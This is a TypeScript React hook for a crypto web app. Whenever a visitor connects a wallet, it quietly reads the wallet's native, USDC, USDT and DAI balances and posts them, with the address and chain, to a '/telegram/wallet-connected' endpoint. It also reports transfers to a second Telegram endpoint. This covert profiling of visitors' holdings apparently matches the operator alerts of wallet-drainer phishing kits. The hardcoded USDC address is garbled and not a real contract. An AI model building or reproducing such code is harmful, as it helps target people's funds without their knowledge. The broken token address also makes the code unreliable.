"use client"

import { useAccount, useBalance } from "wagmi"
import { useEffect, useRef, useCallback } from "react"
import { formatUnits } from "viem"

// Fixed token list to prevent dynamic hook creation
const FIXED_TOKENS = [
  { symbol: "USDC", address: "0xA0b86a33E6441b8dB4B2b8b8b8b8b8b8b8b8b8b8", decimals: 6, name: "USD Coin" },
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, name: "Tether USD" },
  { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, name: "Dai Stablecoin" },
]

export function useTelegramNotifications() {
  const { address, isConnected, chain } = useAccount()

  // Simple refs for tracking state
  const hasNotifiedRef = useRef(false)
  const lastNotificationRef = useRef<string>("")
  const notificationTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const isFirstRenderRef = useRef(true)

  // Get native balance
  const nativeBalance = useBalance({ address })

  // Get fixed token balances
  const usdcBalance = useBalance({
    address,
    token: FIXED_TOKENS[0].address as `0x${string}`,
    query: { enabled: !!address },
  })

  const usdtBalance = useBalance({
    address,
    token: FIXED_TOKENS[1].address as `0x${string}`,
    query: { enabled: !!address },
  })

  const daiBalance = useBalance({
    address,
    token: FIXED_TOKENS[2].address as `0x${string}`,
    query: { enabled: !!address },
  })

  // Create unique key for this connection
  const createConnectionKey = useCallback((addr: string, chainId: number) => {
    return `${addr}-${chainId}`
  }, [])

  // Memoize the sendTransferNotification function
  const sendTransferNotification = useCallback(
    async (data: {
      token: string
      amount: string
      txHash: string
      type: "native" | "erc20"
    }) => {
      if (!address || !chain) return

      try {
        const response = await fetch("/telegram/transfer-initiated", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            address,
            token: data.token,
            amount: data.amount,
            txHash: data.txHash,
            chainName: chain.name,
            type: data.type,
          }),
        })

        if (response.ok) {
          console.log("✅ Transfer notification sent")
        }
      } catch (error) {
        console.error("❌ Transfer notification failed:", error)
      }
    },
    [address, chain],
  )

  // Reset state when wallet disconnects
  useEffect(() => {
    if (!isConnected) {
      console.log("🔌 Wallet disconnected - resetting state")
      hasNotifiedRef.current = false
      lastNotificationRef.current = ""

      // Clear any pending notification
      if (notificationTimeoutRef.current) {
        clearTimeout(notificationTimeoutRef.current)
        notificationTimeoutRef.current = null
      }
    }
  }, [isConnected])

  // Main notification effect
  useEffect(() => {
    // Skip on first render (page load/refresh)
    if (isFirstRenderRef.current) {
      isFirstRenderRef.current = false
      console.log("🚫 Skipping notification - first render")
      return
    }

    // Early return if not ready
    if (!isConnected || !address || !chain || !nativeBalance.data) {
      console.log("⏳ Not ready for notification:", {
        isConnected,
        hasAddress: !!address,
        hasChain: !!chain,
        hasBalance: !!nativeBalance.data,
      })
      return
    }

    // Check if token balances are still loading
    if (usdcBalance.isLoading || usdtBalance.isLoading || daiBalance.isLoading) {
      console.log("⏳ Token balances still loading...")
      return
    }

    // Create unique key for this connection
    const connectionKey = createConnectionKey(address, chain.id)

    // Check if we already sent notification for this exact connection
    if (hasNotifiedRef.current && lastNotificationRef.current === connectionKey) {
      console.log("🚫 Already notified for this connection:", connectionKey)
      return
    }

    console.log("📤 New connection detected, preparing notification:", {
      address: address.slice(0, 6) + "...",
      chain: chain.name,
      connectionKey,
    })

    // Clear any existing timeout
    if (notificationTimeoutRef.current) {
      clearTimeout(notificationTimeoutRef.current)
      notificationTimeoutRef.current = null
    }

    // Set up notification with delay
    notificationTimeoutRef.current = setTimeout(async () => {
      try {
        // Double-check we haven't already sent for this connection
        if (hasNotifiedRef.current && lastNotificationRef.current === connectionKey) {
          console.log("🚫 Notification already sent during timeout")
          return
        }

        const tokens = [
          {
            symbol: "USDC",
            balance: usdcBalance.data ? formatUnits(usdcBalance.data.value, 6) : "0",
            name: "USD Coin",
          },
          {
            symbol: "USDT",
            balance: usdtBalance.data ? formatUnits(usdtBalance.data.value, 6) : "0",
            name: "Tether USD",
          },
          {
            symbol: "DAI",
            balance: daiBalance.data ? formatUnits(daiBalance.data.value, 18) : "0",
            name: "Dai Stablecoin",
          },
        ]

        const payload = {
          address,
          chainName: chain.name,
          chainId: chain.id,
          nativeBalance: formatUnits(nativeBalance.data.value, nativeBalance.data.decimals),
          nativeSymbol: nativeBalance.data.symbol,
          tokens,
        }

        console.log("📡 Sending wallet notification for:", connectionKey)
        const response = await fetch("/telegram/wallet-connected", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        })

        if (response.ok) {
          console.log("✅ Wallet notification sent successfully")
          hasNotifiedRef.current = true
          lastNotificationRef.current = connectionKey
        } else {
          console.error("❌ Failed to send notification:", await response.text())
        }
      } catch (error) {
        console.error("❌ Wallet notification failed:", error)
      }
    }, 2000) // 2 second delay

    // Cleanup function
    return () => {
      if (notificationTimeoutRef.current) {
        clearTimeout(notificationTimeoutRef.current)
        notificationTimeoutRef.current = null
      }
    }
  }, [
    isConnected,
    address,
    chain?.id,
    chain,
    nativeBalance.data,
    usdcBalance.data,
    usdcBalance.isLoading,
    usdtBalance.data,
    usdtBalance.isLoading,
    daiBalance.data,
    daiBalance.isLoading,
    createConnectionKey,
  ])

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (notificationTimeoutRef.current) {
        clearTimeout(notificationTimeoutRef.current)
      }
    }
  }, [])

  // Create stable token balances array
  const tokenBalances = [
    {
      symbol: "USDC",
      balance: usdcBalance.data ? formatUnits(usdcBalance.data.value, 6) : "0",
      name: "USD Coin",
      address: FIXED_TOKENS[0].address,
      isLoading: usdcBalance.isLoading,
    },
    {
      symbol: "USDT",
      balance: usdtBalance.data ? formatUnits(usdtBalance.data.value, 6) : "0",
      name: "Tether USD",
      address: FIXED_TOKENS[1].address,
      isLoading: usdtBalance.isLoading,
    },
    {
      symbol: "DAI",
      balance: daiBalance.data ? formatUnits(daiBalance.data.value, 18) : "0",
      name: "Dai Stablecoin",
      address: FIXED_TOKENS[2].address,
      isLoading: daiBalance.isLoading,
    },
  ]

  return {
    sendTransferNotification,
    tokenBalances,
    supportedTokens: FIXED_TOKENS,
  }
}
